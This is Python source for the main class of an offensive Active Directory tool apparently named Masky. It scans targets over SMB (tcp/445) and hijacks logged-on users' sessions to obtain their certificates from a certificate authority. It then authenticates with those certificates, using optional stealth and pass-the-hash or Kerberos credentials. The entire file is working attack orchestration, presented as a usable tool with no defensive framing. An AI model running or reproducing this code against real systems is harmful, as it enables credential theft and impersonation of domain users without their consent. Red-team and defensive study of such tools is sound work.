import socket
import logging
from .utils.toolbox import scan_port
from .lib.smb import Smb
from .lib.cert.auth import Authenticate
from .utils.tracker import Tracker
from .utils.logger import add_result_level

logger = logging.getLogger("masky")


class Masky:
    def __init__(
        self,
        ca,
        user,
        template="User",
        domain=".",
        password=None,
        hashes=None,
        kerberos=False,
        dc_ip=None,
        quiet=True,
        stealth=False,
        exe_path=None,
        file_args=False,
    ):
        self.__ca = ca
        self.__template = template
        self.__domain = domain
        self.__user = user
        self.__password = password
        self.__hashes = hashes
        self.__kerberos = kerberos
        self.__dc_ip = dc_ip
        self.__dc_target = None
        self.__quiet = quiet
        self.__stealth = stealth
        self.__exe_path = exe_path
        self.__file_args = file_args
        self.__tracker = Tracker()

    def __process_options(self):
        try:
            self.__dc_target = socket.gethostbyname(self.__domain)
        except:
            self.__dc_target = self.__dc_ip
        if self.__dc_target == "0.0.0.0":
            self.__dc_target = self.__dc_ip
        if not self.__dc_target:
            err_msg = f"The provided domain '{self.__domain}' cannot be resolved, please set the full FQDN or provide the DC IP address"
            logger.error(err_msg)
            self.__tracker.last_error_msg = err_msg
            return False
        return True

    def __process_certificate(self, user_data):
        certipy_auth = Authenticate(
            self.__tracker, self.__domain, self.__dc_ip, user_data, False, False
        )
        if certipy_auth.authenticate():
            return True
        return False

    def run(self, target):
        self.__tracker = Tracker()
        add_result_level()
        if self.__quiet:
            logger.disabled = True

        if not self.__process_options():
            return None

        if not scan_port(target):
            logger.info("The port tcp/445 seems not exposed, skipping this target")
            return None

        s = Smb(
            self.__tracker,
            self.__domain,
            self.__user,
            password=self.__password,
            hashes=self.__hashes,
            kerberos=self.__kerberos,
            dc_target=self.__dc_target,
            stealth=self.__stealth,
            exe_path=self.__exe_path,
            file_args=self.__file_args,
        )
        rslt = None
        try:
            rslt = s.exec_masky(target, self.__ca, self.__template)
        except:
            return rslt

        self.__tracker.nb_hijacked_users = len(rslt.users)
        if not rslt or not rslt.users:
            logger.info("No user session was hijacked")
            return None

        if len(rslt.users) == 1:
            logger.info(f"{len(rslt.users)} user session was hijacked")
        else:
            logger.info(f"{len(rslt.users)} user sessions were hijacked")

        for user_data in rslt.users:
            logger.debug(
                f"Start processing PFX of the user '{user_data.domain}\{user_data.name}'"
            )
            if not self.__process_certificate(user_data):
                logger.warn(
                    f"Fail to process gathered certificate related to the user '{user_data.domain}\{user_data.name}'"
                )
            else:
                logger.debug(
                    f"End processing PFX of the user '{user_data.domain}\{user_data.name}'"
                )
        return rslt

    def get_last_tracker(self):
        return self.__tracker
